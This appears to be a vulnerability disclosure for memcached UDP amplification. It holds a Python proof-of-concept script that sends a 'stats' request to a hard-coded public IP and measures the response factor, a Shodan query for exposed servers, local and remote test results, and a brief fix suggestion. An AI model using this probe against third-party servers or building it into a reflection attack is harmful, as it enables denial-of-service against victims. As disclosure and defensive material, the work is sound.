# payload
```
import socket
from loguru import logger
import sys
from time import sleep

logger.remove(handler_id=None)
level = "INFO"
logger.add(sink=sys.stdout, level=level)

host='47.104.221.142'
port=11211

def recv_all(sock):
    sock.settimeout(1)
    recv_data = b''
    data_len = 0
    while True:
        try:
            data = sock.recv(1024)
            if data == b'':
                break
            recv_data += data
            data_len += len(data)
        except Exception as e:
            break

    return recv_data, data_len

def handler(msg):

    recv_data = b''
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(msg, (host, port))
    msg_len = len(msg)
    
    data, data_len = recv_all(sock)

    logger.info(f'send_len: {msg_len} -> res_len: {data_len}')
    factor_l7 = data_len / msg_len
    logger.info(f"factor_l7: {factor_l7}")

    sock.close()

get_stats_128_60 = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'

def main():
    msgs = get_stats_128_60
    handler(msgs)

if __name__ == '__main__':
    main()
```

# local test
Complite memcached version 1.6.29.

Run memcached with `./memcached -u root`

The service runs on UDP port 11211 by default.
![1](assests/1.png)

Sending requests to the service port using payload.py can result in an amplified response, with an amplification factor of about 103.
![2](assests/2.png)

# remote test

Using Shodan to search `port:11211 product:"Memcached"`, you can find approximately 16,850 available Memcached services.

![4](assests/4.png)

"Sending requests to the service port using `payload.py` can result in an amplified response, with an amplification factor of about 115.

![3](assests/3.png)

# fix suggest

It is recommended to implement necessary access control policies and rate limiting in Memcached to prevent its use in distributed amplification denial-of-service attacks.